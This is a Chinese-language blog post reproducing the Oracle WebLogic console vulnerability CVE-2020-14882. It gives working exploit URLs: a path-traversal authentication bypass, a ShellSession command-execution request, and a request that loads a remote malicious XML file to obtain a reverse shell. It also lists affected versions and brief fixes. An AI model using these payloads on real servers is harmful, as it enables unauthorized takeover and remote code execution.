> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CkyFuVk5ihd9UAWZKGthSw)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G5awqiamk1X1hk1mbES3XS6fIrXibjP96e7FL489xQEAb7sZtZCXUk4A7A/640?wx_fmt=jpeg)

(CVE-2020-14882)  

**前言:**

Weblogic 是美国 Oracle 公司出品的一个 Application Server，确切的说是一个基于 JavaEE 架构的中间件，Weblogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。

**漏洞描述:**

存在于 Oracle Fusion Middleware（组件：控制台）的 Oracle WebLogic Server 产品中的漏洞。利用该漏洞，远程攻击者可以构造特殊的 HTTP 请求，在未经身份验证的情况下接管 WebLogic Server Console，并在 WebLogic Server Console 执行任意代码。

**漏洞复现 (****Weblogic 12 版本)****:**

首先看一下是否存在未授权访问漏洞。

访问如下 url

```
http://ip:7001/console/css/%252e%252e%252fconsole.portal
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G56f2XJBJscMSiaxAJy5km7M7xo51TG39DkO8ibibgoMmMpAXLJicEzx9rvQ/640?wx_fmt=png)  

执行命令, 创建一个文件。

```
http://ip:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/gem%27);%22);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G537XutibdtrxCicGeqSGUJgYavXVlG9IbljpbBKk4DUM37cOeUic09yy2A/640?wx_fmt=png)

创建成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G53me3cosjXfXt14m4702u14LgH5pptlh19NufgRorqQn9nFvJEuPk3g/640?wx_fmt=png)

构建恶意 xml，部署本地 web 服务上，迫使受害机下载执行嵌入在 xml 文件中的命令。

```
http://ip:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://ip/shell.xml%22)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G53QiceWKIibDBIKLIfx7qfLJc59VJ3BlWrGNTMd001x8sYw6YasgGkYFA/640?wx_fmt=png)

反弹成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G5qJrEdUmr6Zbkj9YF24xCuia2BbhjhZ10Qfg4Kk1CibM2icZUeOrHhgvWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25rQaTvrACXnFmCiacnaN7G5zQt04gxztQQGCpUwYsvTOhCNQUCq9ib2mHpSFvv9E7whpJwojoy9E5w/640?wx_fmt=png)

**影响版本:**  

<table><tbody><tr><td width="268" valign="top">Weblogic<br></td><td width="268" valign="top">10.3.6.0.0 版本</td></tr><tr><td width="268" valign="top">Weblogic</td><td width="268" valign="top">12.1.3.0.0 版本</td></tr><tr><td width="268" valign="top">Weblogic</td><td width="268" valign="top">12.2.1.3.0 版本</td></tr><tr><td width="268" valign="top">Weblogic</td><td width="268" valign="top">12.2.1.4.0 版本</td></tr><tr><td width="268" valign="top">Weblogic</td><td width="268" valign="top">14.1.1.0.0 版本</td></tr></tbody></table>

**修复建议:**  

及时更新版本;  

限制访问路径.

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)

一起学习，请关注我![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4hZQYrCwcz8gD1evatvHgAquT3YhfNMxgqib63eQ1mRnQVjQA6W9icxFg/640?wx_fmt=png)

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。